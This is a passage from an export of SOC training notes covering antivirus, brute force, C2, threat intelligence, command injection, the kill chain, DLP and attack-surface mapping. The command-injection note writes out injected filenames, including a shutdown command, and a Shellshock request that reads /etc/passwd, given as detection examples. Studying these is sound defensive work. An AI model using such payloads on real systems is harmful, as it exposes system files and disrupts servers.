packaged using encryption measures and compression to avoid any detection. The C2 channel and tunnel deployed in the earlier phases will come in handy during this process.\nImpact\n(MITRE Tactic TA0040)\nIf the adversary seeks to compromise the integrity and availability of the data assets, they would manipulate, interrupt or destroy these assets. The goal would be to disrupt business and operational processes and may involve removing account access, disk wipes, and data encryption such as ransomware, defacement and denial of service (DoS) attacks.\nThe adversary may also wipe out the victim system in this stage to remove any traces of him."},"SOC/Antivirus-Software":{"slug":"SOC/Antivirus-Software","filePath":"SOC/Antivirus Software.md","title":"Antivirus Software","links":[],"tags":[],"content":"What is Antivirus Software (AV)?\nAntivirus Software (AV) is security software that detects malware on devices and blocks and removes malware from the system before it harms the device.\nTypes of Antivirus Software\nAntivirus software is generally responsible for scanning the system for security. Antivirus software can be divided into subtypes according to scanning methods:\nSignature-Based Scanning\nIn the signature-based scanning method, the antivirus software scans the system to detect malware with a digital signature, and if there is a matching signature, it marks the file it scans and matches as malicious and clears the file from the system. In this method, digital signatures are kept on the system in the database and must be constantly updated with up-to-date malware signatures. It is a method that has been used from the past to the present and is effective in detecting known malware. Although it does not catch every single malware, it can detect most of them.\nHeuristic Scanning\nThe heuristic scanning method is a very different malware detection method than the previous signature-based scanning method. Instead of detecting by signature, it monitors the accesses and behaviors of the examined file. In this way, the probability of detecting malicious activities is much higher. For example, this behavior is flagged as suspicious if the executable file that the antivirus tracks is trying to read or modify a system file it shouldn’t be able to access. Even if its signature is not in the antivirus database as malicious, it may be executable malware. This situation is logged by the antivirus.\nFunctions of Antivirus Software\n\n\nTo detect malware in the system by constantly scanning the system\n\n\nProtecting the system against external threats\n\n\nCleaning detected malware from the system\n\n\nLogic Behind How Antivirus Software Works\nThe working logic of antivirus software is shown as follows:\n\n(Source: www.youtube.com/watch)\nThe Importance of Antivirus Software for Security\nAntivirus software, which has a long history, is of great importance in terms of security. Periodic security scans on systems are one of the most basic security procedures to be performed. Antivirus software is one of the most effective ways to detect known malware and quickly clean it from the system. If an institution does not have antivirus software, it means that security is weak at some point. Using antivirus software with an up-to-date malware signature database is necessary to ensure security today.\nSome popular Antivirus products used in the cybersecurity industry are as follows:\n\n\nMcAfee\n\n\nSymantec\n\n\nBitdefender\n\n\nEset\n\n\nNorton\n\n\nWhat log sources does Antivirus Software have?\nAntivirus software keeps logs of the findings it obtains in its periodic scans or a special scan of a specific file. These logs contain information about the detected malware. For example, information such as the size of the file, the name of the file, its signature, and the type of malware can be included in the logs. Thanks to these logs, information on retrospective scans and malware detections can be obtained.\nIn this part of the training, what Antivirus software is, its types, tasks, working logic, and importance for security were discussed. In the next part of the training, “Sandbox Solutions” will be explained."},"SOC/Asset-Management-Solutions":{"slug":"SOC/Asset-Management-Solutions","filePath":"SOC/Asset Management Solutions.md","title":"Asset Management Solutions","links":[],"tags":[],"content":"What is Asset Management Solutions?\nAsset Management Solutions is software that can implement all asset management operations such as monitoring the operating status of assets in the corporate network, maintaining them, and removing them when necessary.\nBenefits of Asset Management Software\n\nIt facilitates the implementation of standards.\nIt helps with documentation.\nIt improves the working performance of assets.\nProvides inventory control.\nProvides strategic decision-making support.\n\nTypes and Components of IT Asset Management\nThe four main managed IT assets are:\n\nSoftware\nHardware\nMobile devices\nThe Cloud\n\nThe Importance of Asset Management Software for Security\nToday, there are many devices that act as security products or network products in a corporate network. The increase in the number of devices in the network makes it difficult to manage the devices. Therefore, the things to follow about the devices may cause the details to be overlooked. Asset Management Tools are used to prevent this situation. It is very important that Asset Management tools do their jobs accordingly. Thanks to Asset Management Tools, outdated software can be easily detected and managed. For example, quick action is critical when a security update arrives that patches an important vulnerability in a firewall device. Because as time passes, there may be malicious activities aimed at critical vulnerabilities. Thanks to Asset Management Tools, you can be notified about security updates quickly and updates are made quickly.\nSome popular Asset Management Tools used in the cybersecurity industry are as follows:\n\nAssetExplorer\nIvanti\nArmis\nAsset Panda\n"},"SOC/Backdoor":{"slug":"SOC/Backdoor","filePath":"SOC/Backdoor.md","title":"Backdoor","links":["SOC/Pyramid-of-Pain","HTB/Remote-Shells","HTB/Services"],"tags":[],"content":"Maintaining access is important for adversaries, but it is very difficult. The longer a system has been compromised, greater are the risks of detection, and once detected the vulnerabilities will be patched and the cycle of pain continues. To break this cycle, adversaries usually set up a way to still remain in control even after the vulnerability is patched. This is what we call a backdoor, an alternate way in.\nTo achieve this, adversaries modify system settings or applications to receive malicious requests and execute them. There are number of backdoors a adversary can install on a system such as\n\nRemote Shells\nModified Windows Services\n"},"SOC/Brute-Force-Attack":{"slug":"SOC/Brute-Force-Attack","filePath":"SOC/Brute Force Attack.md","title":"Brute Force Attack","links":["web-attacks"],"tags":[],"content":"What is Brute Forcing?\nBrute forcing is a type of attack that involves attempting to guess a password or authentication token by systematically trying every possible combination of characters until the correct one is found. In the context of web attacks, brute forcing typically refers to the process of using automated tools to repeatedly submit login requests to a web application using different username and password combinations until a valid one is discovered.\nBrute force attacks can be used to gain unauthorized access to a system, steal sensitive information, or launch further attacks against the target or other systems. They can be particularly effective against weak or poorly protected passwords, but can also be very time-consuming and resource-intensive for the attacker, especially if the target system has implemented measures to detect and block brute force attacks.\nBrute force attacks are one of the simplest and most straightforward methods of attacking a web application, and it works by systematically trying every possible combination of usernames and passwords until the correct one is found. This process is typically automated using specialized software or scripts, which can try thousands or even millions of combinations per second.\nThe basic idea behind a brute force attack is to exploit the weak or easily guessable passwords that a lot of people use especially the non-techy users, such as common dictionary words, simple number sequences, or their own names or birthdates. By systematically trying every possible combination of characters, attackers can eventually find the correct password and gain access to the target system.\nBrute Forcing Possible Vectors\nBrute forcing on web applications is a common attack vector used by hackers to gain unauthorized access to user accounts or web servers. In this type of attack, the attacker will use automated tools to submit multiple login requests to the targeted web application using different usernames and passwords, in an attempt to find the correct credentials and gain access to the system.\nWeb applications are particularly vulnerable to brute force attacks because they are often accessible over the internet and rely on user authentication to control access to sensitive data or functionality. If an attacker is able to guess a valid username and password, they can potentially gain access to sensitive user data, such as financial information, personal data, or confidential business information. \nActually, it’s not just guessing usernames and passwords also, directory brute forcing on web applications is another type of brute force attack that involves guessing file or directory names on a web server in order to find hidden or sensitive files or directories. In this type of attack, the attacker will use automated tools to submit requests to the targeted web server using different file or directory names, in an attempt to find files or directories that are not meant to be publicly accessible.\nThis type of attack can be effective against web applications that do not implement proper access controls or that have poorly configured web servers. To prevent directory brute force attacks, web application developers can implement access controls to restrict access to sensitive files and directories, and can configure their web servers to block requests for known sensitive files and directories.\nHow Brute Forcing Works?\nHere’s an example of vulnerable code that is susceptible to Brute Forcing attacks in a PHP script:\n\nThis form is vulnerable to brute force attacks because it allows unlimited login attempts and does not implement any security measures to prevent automated login attempts.\nHere’s an example of how you can use Python requests library to send multiple login requests with a list of usernames and passwords:\n\nImpact of Brute Forcing\nBrute forcing can have significant impacts on a target system or application. Here are some of the potential impacts of brute forcing:\n\n\nDenial of service: Brute forcing can consume a significant amount of computing resources, such as CPU cycles and memory, which can lead to system slowdowns or crashes. This can cause a denial of service (DoS) attack, which makes the target system unavailable to legitimate users.\n\n\nData leakage: Successful brute force attacks can allow unauthorized access to sensitive data, such as login credentials, personal information, financial data, and intellectual property. This can lead to data breaches, which can have severe consequences for the target organization, including financial losses and damage to reputation.\n\n\nAccount takeover: Brute forcing can allow attackers to gain access to user accounts without the owner’s consent. Once an attacker has access to an account, they can carry out malicious activities, such as stealing data, sending spam, or carrying out further attacks.\n\n\nPassword reuse: Brute forcing can reveal weak or easily guessable passwords, which can encourage users to reuse passwords across multiple accounts. This can increase the risk of compromise, as a successful brute force attack on one account can provide access to multiple accounts.\n\n\nLegal and reputational consequences: Brute forcing is illegal and unethical, and can result in significant legal and reputational consequences for individuals and organizations who engage in it. If caught, attackers can face criminal charges, fines, and other penalties. Additionally, organizations who are victims of brute force attacks may suffer reputational damage, loss of trust from customers and stakeholders, and legal liability for failing to protect their systems and data.\n\n\nPrevention Methods for Brute Forcing\nImplement account lockout policies: After a certain number of failed login attempts, lock the user account for a specified period of time, to prevent further login attempts. This will make brute force attacks more difficult, as the attacker will need to wait for the account to become unlocked before attempting more login attempts.\nImplement CAPTCHA: Use CAPTCHA or other bot detection mechanisms to detect automated login attempts and prevent them from succeeding.\nLimit the rate of login attempts: Implement a mechanism that limits the number of login attempts that can be made within a certain time period (e.g. 5 login attempts per minute). This will slow down brute force attacks, as the attacker will need to wait between attempts.\nUse multi-factor authentication: Require users to provide additional authentication factors, such as a one-time code sent via SMS or email, in addition to their username and password.\nMonitoring login attempts: This involves monitoring login attempts for signs of suspicious activity, such as multiple failed login attempts from the same IP address, or unusual spikes in traffic or requests. This can help to detect and prevent brute force attacks before they are successful.\nUsing strong passwords and password policies: This involves requiring users to choose strong passwords that are difficult to guess, and enforcing password policies that require users to change their passwords regularly and prohibiting the use of weak or easily guessable passwords.\nWeb Application Firewalls (WAFs) are commonly used to protect web applications from various types of attacks, including brute force attacks. Here are some ways WAFs can prevent brute force attacks; \nIP blocking: WAFs can block access to the web application from IP addresses that have made excessive login attempts or have triggered other security rules. This can prevent brute force attacks by blocking the attacker’s access to the application altogether.\nUser behavior analysis: WAFs can analyze user behavior patterns to detect abnormal activity, such as a high rate of login attempts or unusual login times. This can help prevent brute force attacks by detecting and blocking suspicious behavior before it becomes a problem.\nIt’s important to note that WAFs are not foolproof and can be bypassed by skilled attackers. Therefore, it’s important to implement multiple layers of security controls, such as strong passwords, account lockout policies, and security awareness trainings for users, in addition to using  WAFs.\nBy implementing these measures, the login form can be more secure, robust, and resistant to brute-force attacks.\nDetecting Brute Forcing Attacks\nIn Part 1, we have described what the Brute Forcing is and how to prevent this attack type. In this part, we’ll have a look at the detection techniques and some tips to make it easier to detect and prevent brute force attacks.\nAnalyzing brute force attacks can help you understand the methods used by attackers and identify vulnerabilities in your security controls. To do this, you should collect and store authentication logs from your web application, including the successful logins as well as the failed login attempts. Look for patterns of suspicious activity in the authentication logs, such as a high number of failed login attempts from a particular IP address or user account. Analyze network traffic logs to identify patterns of traffic that may be associated with brute force attacks, such as repeated login attempts from the same IP address or requests to non-existent pages or directories. \nDeploy an intrusion detection system (IDS) or intrusion prevention system (IPS) to analyze network traffic and detect signs of brute force attacks. Look for common attack vectors used in brute force attacks, such as dictionary attacks or password spraying. Identify user accounts that are vulnerable to brute force attacks due to weak passwords or other vulnerabilities. Finally, monitor for incidents of brute force attacks and respond to them promptly by blocking malicious IP addresses, locking out user accounts, and implementing additional security controls as necessary. By following these steps, you can strengthen your security controls and reduce the risk of successful brute force attacks.\nExample Nginx log file that contains Brute Force attack;\n\nThe log file provided shows the unsuccessful login attempts only. In order to detect the successful login attempts, you would need to analyze the logs further or modify your logging configuration to include the successful login attempts as well.\nSuccessful login attempts would typically result in a response code of 200 or a redirect to a different page, which can be identified in the log file. However, keep in mind that some attackers may attempt to obfuscate their successful login attempts by logging in with valid credentials or using a compromised account, so it is important to perform further analysis to determine if any suspicious activity is occurring.\n\nIn this example, the log entry shows a POST request to the /login.php page with a response code of 302, which indicates a successful login attempt. The Cookie header also includes a PHPSESSID value and a login value, which may be used to track the user session and authentication status. Note that the exact format and contents of the log files can vary depending on the web server and its configuration.\nTo detect brute force attacks in nginx log files, you can use various tools and techniques such as:\nLog analysis tools: There are several log analysis tools such as Logstash, ElasticSearch, and Kibana (ELK Stack) that can help you analyze nginx log files and detect brute force attacks. These tools will allow you to search for specific patterns in the log files, such as repeated failed login attempts from the same IP address or user agent.\nRegular expressions: Regular expressions can be used to search for specific patterns in the log files. For example, you can use a regular expression to match a sequence of repeated failed login attempts from the same IP address or user agent.\nThings that you can do after the detection:\nFail2ban: Fail2ban is a popular intrusion prevention tool that can be used to automatically block the IP addresses that are detected as engaging in brute force attacks. Fail2ban works by monitoring the nginx log files and applying predefined filters to detect and block suspicious activity.\nIP blocking: You can manually block IP addresses that are detected as engaging in brute force attacks by adding them to the nginx configuration file. For example, you can use the deny rule to block traffic from specific IP addresses:\n\nIt’s important to note that detecting brute force attacks is not always a straightforward process and may require additional analysis and investigation to identify the suspicious activity accurately.\nHere’s an example of a regular expression that can be used to detect repeated failed login attempts from the same IP address in an nginx log file:\n/^(\\S+) \\S+ \\S+ [.?] “(POST|GET) /login.php.” (401|403) \\d+ ”.?” ”.?”/gm\nThis regular expression will match any log file entry that includes a failed login attempt (401 or 403 status code) to the /login.php page. It will capture the IP address of the client making the request in the first capture group ((\\S+)). You can then use a log analysis tool or script to count the number of times each IP address appears in the log file and flag any IP addresses that have a high number of failed login attempts as potential brute force attackers. Also, you can update the regex’s IP address as suspicious IP source.\nIn this lesson, we have covered the Brute Forcing attack. We have talked about how the vulnerability appears, as well as the detection and the prevention methods."},"SOC/C2":{"slug":"SOC/C2","filePath":"SOC/C2.md","title":"C2","links":["HTB/Reverse-Shell","Networking/DNS"],"tags":[],"content":"Command and Control (C2) Infrastructure are a set of programs used to communicate with a victim machine. This is comparable to a Reverse Shell, but is generally more advanced and often communicate via common network protocols, like HTTP, HTTPS and DNS.\nCommon C2 Channels\n1. HTTP/HTTPS\nThe protocols HTTP on port 80 and HTTPS on port 443 - this type of beaconing blends the malicious traffic with the legitimate traffic and can help the attacker evade firewalls.  \n2. DNS\nThe infected machine makes constant DNS requests to the DNS server that belongs to an attacker, this type of C2 communication is also known as DNS Tunneling.\nImportant to note that an adversary or another compromised host can be the owner of the C2 infrastructure."},"SOC/CTI-Lifecycle":{"slug":"SOC/CTI-Lifecycle","filePath":"SOC/CTI Lifecycle.md","title":"CTI Lifecycle","links":[],"tags":[],"content":"\nPlanning and Direction\nThe planning and directing phase should be the foundation of a structure that must function flawlessly. Planning is the part that allows us to find answers to questions such as what exactly is expected from intelligence, who will consume the intelligence obtained, and which teams or individuals will take action as a result of the intelligence obtained. Intelligence will be used by executives or a team of analysts. You can directly feed your SOC team with the intelligence obtained and/or present summary reports to your managers. At this point, what you want is important. Your requests will also clarify the scope of the intelligence. For example, an organization can determine the scope of intelligence it wants to obtain by asking the following questions:\nDoes your organization have a SOC team?\nThis question shows us whether there is a technical team that will actively use the intelligence obtained, and if there is, it is an indication that shows us we can go down to the technical details of the intelligence. If there is not a SOC team it indicates that the intelligence will be consumed by managers. In this case, an intelligence model that offers clearer and more understandable summaries can be taken as a basis, without being bogged down in technical details.\nHas your organization been attacked before? If so, what was the success rate of the attack?\nThe fact that the organization was exposed to a high rate of successful attacks can be used to reduce the success rate of future attacks by putting the intelligence on the basis of the established structure, and the intelligence obtained with the data collected from the current attacks. This tells us how often we will use intelligence in the organization. It controls how often we pull data from internal and external sources. It is important that the intelligence obtained is constantly updated and consumed quickly for frequently attacked organizations.\nDo the attacks target organization or individuals?\nIt is important to focus on the External Attack Surface Management area, which the intelligence contains, to make the threat surface as clear as possible and to follow it up regularly for attacks targeting the organization. External Attack Surface Management is to determine and manage the attack surface of organizations. It will be covered in detail in the following sections. For attacks targeting individuals, the Digital Risk Protection part is crucial. Digital Risk Protection defines the digital risks that organizations may face through the attack surface. It will be covered in detail in the following sections. It reveals that we need to clarify certain issues such as users’ login credentials, their risks to be exposed to phishing attacks, and defining the strength of your password policy.\nAre other companies in your industry exposed to the same attacks you received?\nThis question explains the need for us to turn to industry-based intelligence that provides us with intelligence about other companies in our industry. When other companies are getting attacked, industry-based intelligence provides us with the IOC (Indicators used to identify attacks digitally, and threat actors) related to that specific attack, and also it will allow us to avoid that attack with minimum damage if we are exposed to the same attack.\nInformation Gathering\nThe information collection stage is the part where we determine what sources we will collect data from. These resources can be both internal and external. Some of the sources we will collect data from are as follows:\n\n\nHacker Forums\n\n\nRansomware Blogs\n\n\nDeep/Dark Web Forums and Bot Markets\n\n\nPublic Sandboxes\n\n\nTelegram/ICQ/IRC/Discord/Twitter/Instagram/Facebook/LinkedIn\n\n\nSurface Web(Cybersecurity Blogs etc.)\n\n\nPublic Research Reports\n\n\nFile Download Sites\n\n\nGithub/Gitlab/Bitbucket etc.\n\n\nPublic Buckets (Amazon S3/Azure Blob etc.)\n\n\nShodan/Binary Edge/Zoomeye vb.\n\n\nSources that provide IOC (Alienvault, Abuse.ch, MalwareBazaar vb.)\n\n\nHoneypots\n\n\nSIEM, IDS/IPS, Firewalls\n\n\nPublic Leak Databases\n\n\nProcessing\nThe data obtained is processed at this stage which may be considered a filter. We clean the data from false positives as much as possible, pass it through certain rule sets, and subject it to some correlations. At the end of this process, we get the information we need.\nAnalysis and Production\nThe information obtained is interpreted and analyzed at this stage and the consumable intelligence is obtained as a result of the output of the analysis. After this point, appropriate reports are to be prepared according to who will consume the intelligence.\nDissemination and Feedback\nDissemination of the intelligence appropriately is the next step for whom the intelligence is intended. For example, intelligence from external sources to the technical team should be distributed to other users in the organization through appropriate channels, and the necessary feedback should be given to make the intelligence better and more efficient at the end of the whole process. Let’s say that content with the name of our organization is created through a site builder at the subdomain of letsdefend.blogspot.com. If the blogspot.com domain is marked as suspicious or harmful in the intelligence and not this subdomain, this will result in many false positives. In such cases, we need to improve the intelligence with feedback."},"SOC/CTI-Types":{"slug":"SOC/CTI-Types","filePath":"SOC/CTI Types.md","title":"CTI Types","links":[],"tags":[],"content":"Types of Cyber ​​Threat Intelligence\nCyber ​​threat intelligence varies by position within the organization. The intelligence is divided into types since the threat intelligence the technical staff and the manager receive is not the same. The intelligence that the L1 SOC analyst and the SOC manager will receive will differ. This way the intelligence becomes more appealing to its final consumer.\n\nTechnical Cyber ​​Threat Intelligence\nTechnical CTI can be considered as the output of more technical analysis studies based on IOCs. It is an output of the technical CTI to create certain rulesets and to protect the organization against attacks by using a report containing hashes of malicious IP addresses, phishing domains, and malicious files, and by investigating the information obtained from this report. This type of intelligence is generally used by the technical personnel (SOC Analyst, Incident Responder) in the organization.\nTactical Cyber ​​Threat Intelligence\nTactical CTI is used to understand the TTP (Technical, Tactical, Procedure) of the attackers by trying to find answers to certain questions. For instance, we have an intelligence report containing the TTP of an attacker named “mordecai”. When we go over this report we should be able to find answers to questions like “what vulnerabilities does the attacker use the most?”, “in which countries does the attacker operate?”, “what is the attacker’s motivation?”, and “what methods does the attacker use?” to be able to protect our organization by taking precautionary measures against a possible attack. This intelligence is mostly provided for the management personnel (i.e. SOC Manager, etc.) who are leading the technical teams.\nOperational Cyber Threat Intelligence\nOperational CTI is often confused with Tactical CTI because they have so much in common. Operational CTI also focuses on the attackers’ TTPs just like Tactical CTI but it is mostly used for Threat Hunting, unlike tactical CTI. While tactical CTI is a more automated process, operational CTI can focus on a specific type of attack, or a single attacker in particular, and carry out the investigation to a narrower scope. This type of intelligence can be used by Security Managers or Threat hunting personnel in the organization.\nStrategic Cyber ​​Threat Intelligence\nStrategic CTI is for the top executives of the organization. It is generally used for long-term tasks such as product purchasing, budgeting, and planning for the organization in the long run by weighing the tactical CTI outputs."},"SOC/Command-Injection":{"slug":"SOC/Command-Injection","filePath":"SOC/Command Injection.md","title":"Command Injection","links":[],"tags":[],"content":"What are Command Injection Attacks?\nCommand injection attacks are attacks that occur when data received from a user is not sanitized and is passed directly to the operating system shell.\n\nAttackers exploit command injection vulnerabilities to execute commands directly on the operating system. Since the attacker’s priority is to take control of the system, these vulnerabilities are more critical than other vulnerabilities.\nA misconfigured web application would grant the attacker access with admin rights because the command the attacker sends uses the rights of the web application user.\nHow does Command Injection work?\nCommand injection vulnerabilities occur when the data received from the user is not sanitized. Let’s examine command injection vulnerabilities with an example.\nSuppose we have a basic web application that copies the user’s file to the “/tmp” folder. The web application code is shown below:\n\nUnder normal circumstances, if used correctly, the application will work normally. For example, if we upload a file called “letsdefend.txt”, it will successfully copy the file to the “/tmp” folder.\nSo what if we upload a file called “letsdefend;ls;.txt”? The command would be:\nCommand: cp letsdefend;ls;.txt\nThe ”;” indicates that the command has ended. So if we look at the payload above, there are three different commands that the operating system executes. These are:\n\ncp letsdefend\nls\n.txt\n\n\nThe first command is for the copying process, but if the parameters are not entered correctly it will not work correctly.\nCommand #2 is the directory listing command that the attacker wants to execute. The user does not receive the command output, so the attacker cannot see the files in the directory, but the operating system successfully executes the command.\nIf the operating system tries to run command number 3, it will get an error message because there is no “.txt” command.\nAs you can see, the code has been executed in the web server’s operating system. So what if the attacker were to upload a file called “letsdefend;shutdown;.txt”? The operating system would shut down and the web application would not be able to function.\nWith the correct payload, the attacker can create a reverse shell in the operating system.\nHow attackers can exploit Command Injection Attacks\nAttackers can execute commands on an operating system by exploiting command injection vulnerabilities. This means that the web application and all other components on the server are at risk.\nHow to Prevent Command Injection\n\nAlways sanitize data you receive from a user: Never trust anything you receive from a user. Not even a file name!\nLimit user privileges: Whenever possible, set web application user rights at a lower level. Few web applications require users to have administrator rights. \nUse virtualization technologies such as dockers.\n\nDetecting Command Injection Attacks\nSo how do we detect command injection attacks?\nActually, there is more than one way. These are:\n\nWhen examining a web request, look at all areas: The command injection vulnerability may be in different areas depending on how the web application works. Therefore, you should check all areas of the web request.\nLook for keywords related to the terminal language: Check the data received from the user for keywords related to terminal commands such as dir, ls, cp, cat, type, etc.\nLearn about commonly used command injection payloads: When attackers discover a command injection vulnerability, they usually create a reverse shell to make their work easier. Therefore, knowing commonly used command injection payloads will make it easier to detect a command injection attack.\n\nA Detection Example\nIn this example, we will not be looking at access logs, but instead at an HTTP request.\n\nGET / HTTP/1.1\nHost: yourcompany.com\nUser-Agent: () { :;}; echo “NS:” $(&lt;/etc/passwd)\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9\nConnection: close\n\nLooking at the HTTP request above, we can see that the main page of the web application yourcompany[.]com was requested.\nBut if we look at the HTTP request headers, we see a suspicious situation in the User-Agent header. There is a bash command in the User-Agent header where there should be browser/operating system information.\nIn fact, this request was captured while a security vulnerability called Shellshock was being exploited. Shellshock is a security vulnerability that was disclosed in 2014 and had a major impact.\nShellshock comes from bash somehow executing environment variables unintentionally. It is a great example of a command injection attack.\nThe contents of the file “/etc/passwd” are returned to the attacker as “NS” in the HTTP response header when the bash command, which is in the user agent, is executed."},"SOC/Cyber-Kill-Chain":{"slug":"SOC/Cyber-Kill-Chain","filePath":"SOC/Cyber Kill Chain.md","title":"Cyber Kill Chain","links":["SOC/Reconnaissance","SOC/Phishing","SOC/Watering-Hole","Zero-day","SOC/Backdoor","HTB/Web-Shell","web-shell","HTB/Services","SOC/Timestomping","SOC/Masquerading","SOC/C2","SOC/Unified-Kill-Chain"],"tags":[],"content":"The Cyber Kill Chain framework is designed for identification and prevention of the network intrusions. The term kill chain is used in military to refer to the steps taken by an adversary to reach its ultimate goal.\nA typical cyber kill chain looks like:\nThe Cyber Kill Chain\n1. Reconnaissance\nReconnaissance is the first step and it provides adversary with all the info needed for getting into a system.\n\n2. Weaponization\nIn this step, the threat actor combines malware and exploit into a deliverable payload. Most attackers usually use automated tools to generate the malware or refer to the Dark Web to purchase the malware.\n\n3. Delivery\nThe delivery of the Weapon can be performed through plenty of ways:\n1. Phishing emails\n2. Delivering malicious urls\n3. Watering Hole attack\n\n4. Exploitation\nExploitation is the step in which the payload is run in the victim system and vulnerabilities are exploited. The malicious actor could exploit software, system, or server-based vulnerabilities to escalate the privileges or move laterally through the network.\nSome examples of exploitation are:\n1. Zero day exploit\n2. Exploit software, hardware or even human exploit\n3. Server based exploit\n\n5. Installation\nOnce the system is exploited, the attacker will install a persistent Backdoor in the system. This persistence can be achieved through various methods:\n1. Installing a Web Shell\nA web shell, because of its simplicity, can be well hidden and difficult to get rid of. Hence, it serves as an excellent Backdoor for an attacker.\n2. Windows Services\nWindows service run in background and can be modified to execute a malicious script or payloads. Adversary may create, or modify a windows service to execute payloads under a service name related to the OS or legitimate software.\n3. Run keys\nAdding the entry to the “run keys” for the malicious payload in the Registry or the Startup Folder. By doing that, the payload will execute each time the user logs in on the computer.\n4. Installing a Backdoor\nAdversary may install other backdoors such as Meterpreter’s Backdoor, to later gain access to the system.\nIn this phase, the attacker can also use the Timestomping and Masquerading techniques to avoid detection by the forensic investigator and hide the malware.\nThe defenders\nThe fact that an attacker who reached this stage is performing malicious activities on the systems indicates that the attacker cannot be detected. Therefore, whether the attacker is present or not, the SOC team should manage and execute security operations under the assumption that there is always an attacker present in the system.\n\n6. Command and Control (C2)\nNow the system has been compromised and a Backdoor has been installed. But the attacker stills needs a way to communicate with the compromised system and that also without being detected. Here comes the role of C2 Server. With C2 server the attacker can easily control the host.\n\n7. Exfiltration\nNow the adversary finally execute their objective which may be stealing data, destroying data, continuing lateral movement, etc.\n\nNext: Unified Kill Chain"},"SOC/Cyber-Threat-Intelligence":{"slug":"SOC/Cyber-Threat-Intelligence","filePath":"SOC/Cyber Threat Intelligence.md","title":"Cyber Threat Intelligence","links":["SOC/CTI-Lifecycle","SOC/CTI-Types","SOC/Determining-the-Attack-Surface","SOC/Gathering-Threat-Intelligence","SOC/Using-Threat-Intelligence"],"tags":[],"content":"Cyber ​​threat intelligence (CTI) is a cyber security discipline that aims to produce actionable output after processing and interpreting the data collected from multiple sources, and to inform organizations against cyber attacks through these outputs to minimize damages.\nCTI basically aims to understand the Techniques, Tactics and Procedures (TTPs) of attackers. CTI means to collect data from multiple sources (IOCs etc.) and processes this data to create information. Organization-specific intelligence can be produced by matching the information related to specific organizations. CTI is a field that keeps constantly changing and evolving by its nature. This change is an inevitable reflection of the cyber security industry. It is possible to explain this field, which keeps up with the change, with certain processes.\nIndex\n1. CTI Lifecycle\n2. CTI Types\n3. Determining the Attack Surface\n4. Gathering Threat Intelligence\n5. Using Threat Intelligence"},"SOC/Data-Loss-Prevention":{"slug":"SOC/Data-Loss-Prevention","filePath":"SOC/Data Loss Prevention.md","title":"Data Loss Prevention","links":[],"tags":[],"content":"What is Data Loss Prevention (DLP)?\nData Loss Prevention (DLP) is a technology that prevents sensitive and critical information from leaving the institution.\nTypes of DLP\nDLP products fall into several types:\n\nNetwork DLP\nNetwork DLP is responsible for taking security actions related to leaving critical and sensitive information on the network outside the organization. For example, the DLP product may block a connection that is attempted to upload a file to an FTP server, request it to be audited, or forward it as a log to the relevant security solution. The action to be taken by the DLP product varies according to its configuration. Additionally, it can report suspicious activity to the administrator.\nEndpoint DLP\nUnlike Network DLP, Endpoint DLP monitors activities on a particular device rather than packet flow within the network. The Endpoint DLP product is installed on the device and after installation, it manages suspicious activities on the device. Endpoint DLP is essential for protecting critical and sensitive information on the devices of remote personnel. For example, an Endpoint DLP product can see whether sensitive information is kept in encrypted form in the device.\nCloud DLP\nCloud DLP is used to prevent sensitive data from leaking over the cloud by working with certain cloud technologies. It is responsible for ensuring that corporate personnel can use cloud applications comfortably without data breaches or loss.\nHow does DLP work?\nWhen DLP detects data in the right format according to the rules defined for it, it blocks the action taken or tries to ensure the security of the transmission by encrypting the data. For example, credit card numbers have a certain format, and when the DLP product in the email content sees the credit card number per this format, it will take the relevant action. The following image shows how DLP works in a basic sense:\n\nThe Importance of DLP for Security\nToday, critical information disclosure is a frequently encountered situation in organizations. It is one of the factors that should be considered, as this situation can have many bad effects. The DLP product is one of the security products that should be used for institutions with critical information, just like other security solutions.\nSome popular DLP products used within the cybersecurity industry are as follows:\n\nForcepoint\nMcAfee\nTrend Micro\nCheckpoint\nSymantec\n"},"SOC/Determining-the-Attack-Surface":{"slug":"SOC/Determining-the-Attack-Surface","filePath":"SOC/Determining the Attack Surface.md","title":"Determining the Attack Surface","links":[],"tags":[],"content":"The Importance of Attack Surface in Threat Intelligence\nToday, classical threat intelligence models are falling short. The concept of External Attack Surface, which has recently entered the literature, has shown us this inadequacy and has closed the deficiencies. This concept has brought a new perspective to threat intelligence. The concept of Extended Threat Intelligence (XTI) has gained more popularity apart from classical intelligence. To define, XTI, unlike CTI, creates an attack surface belonging to the organization in order to produce intelligence specific to the organization. Thanks to this attack surface, organizations gain visibility. This visibility can be a forgotten endpoint or a forgotten subdomain. The main interest at this point is that organizations now know their inventories and clearly know which assets to defend against.\nDetermining the Attack Surface\nWhen creating the attack surface, domains, subdomains, websites, login pages, CMS applications, technologies used on websites, IP addresses, IP blocks, DNS records, C-level employee mails, network applications, operating systems, bin numbers, and swift codes, and SSL certificates will be included. We will determine all these by proceeding through the main domain, which was provided to us by the organization as per the scenario.\nDomains\nThe only information that will be given to us in the first place will be the primary domain of the organization. We will try to create the entire entity structure over this domain. In the sample scenario below, an asset inventory of Abanca, a bank located in Spain, will be created.\nMain Domain: abanca.com\nRelated Domains:\nIn order to find other domains of the company, we can find domains that provide redirects to the main domain. We can use the host.io service for this. Host.io will provide us with all the domains hosted on the same IP, the domains hosting the relevant domain within the website, and other domains hosted by the relevant domain within the website, apart from other domains that provide redirection to the relevant domain. Not all domains obtained may belong to the organization. We can decide which domains belong to the organization and which ones don’t by checking the whois outputs of the domains or by looking at their content.\n\nWhen we search the abanca.com domain on host.io, we can also see other domains hosted on the same IP address in the “Co-Hosted” section.\n\nIn a subsection, we can view other domains that contain our relevant domain, and after making the necessary verifications, we can include these domains in our asset list.\n\nIn the “Links to” section, we can view other domains that our domain hosts within the website.\n\nIn the Redirects section, we can view other domains directed to our domain.\nSince the number of domains displayed on the screen is limited, we can obtain all domains via the API by becoming a member.\nAs a secondary method, we can find similar information in whois records of the primary domain we are working on by performing a Reverse whois lookup (Reverse by Org Name, reverse by Registrant Mail, etc.) for certain information.\n\nFor example, when we look at the whois information of the abanca.com domain, we see that the organization section contains the name of the company. We will be able to see all other domains registered under this organization name when we reverse the organization name. We will use the reverse whois tool at viewdns.info for this.\n\n266 domains containing this name are displayed when we searched “ABANCA” in the search section. These domains are potentially our domains. After we verify each one, we can add it to our inventory.\n\nAlternatively, we can use the whoxy.com tool to do the same check. With this tool, we can reverse whois in 4 categories with the help of this tool.\nAs a third method, we can examine the DNS records of the relevant domain and reach other domains using the same 